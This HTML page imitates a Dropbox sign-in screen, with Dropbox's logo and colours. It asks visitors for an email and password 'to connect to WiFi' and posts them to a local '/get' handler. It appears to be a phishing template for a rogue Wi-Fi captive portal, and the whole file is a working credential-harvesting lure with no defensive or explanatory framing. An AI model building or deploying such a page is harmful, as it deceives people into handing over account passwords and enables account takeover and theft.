<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Dropbox</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
.card{width:100%;max-width:380px;background:#fff;border-radius:8px;padding:40px 32px;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,0.08)}
.logo{margin-bottom:24px}
.logo svg{width:48px;height:48px}
h1{font-size:24px;font-weight:700;color:#282c32;margin-bottom:6px}
p{font-size:14px;color:#637282;margin-bottom:28px}
.form-group{margin-bottom:14px;text-align:left}
.form-group label{display:block;font-size:13px;color:#282c32;margin-bottom:4px;font-weight:600}
.form-group input{width:100%;padding:12px;border:1px solid #d1d5db;border-radius:6px;font-size:16px;outline:none}
.form-group input:focus{border-color:#0061ff}
.btn{width:100%;padding:14px;background:#0061ff;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
.btn:hover{background:#0052d9}
.btn:active{transform:scale(0.98)}
.footer{margin-top:20px;font-size:13px;color:#637282}
.footer a{color:#0061ff;text-decoration:none}
</style>
</head>
<body>
<div class="card">
<div class="logo">
<svg viewBox="0 0 48 48" fill="none"><path d="M12 4l12 8-12 8-12-8z" fill="#0061ff"/><path d="M24 12l12 8-12 8-12-8z" fill="#0061ff"/><path d="M12 28l12 8 12-8-12-8z" fill="#0061ff"/><path d="M36 12l-12 8 12 8 12-8z" fill="#0093e0"/></svg>
</div>
<h1>Sign in to Dropbox</h1>
<p>to connect to WiFi</p>
<form action="/get" method="POST">
<div class="form-group">
<label>Email</label>
<input name="email" type="email" placeholder="Email" required autocomplete="off">
</div>
<div class="form-group">
<label>Password</label>
<input name="password" type="password" placeholder="Password" required autocomplete="off">
</div>
<button type="submit" class="btn">Sign In</button>
</form>
<div class="footer">
<a href="#">Forgot password?</a>
</div>
</div>
</body>
</html>
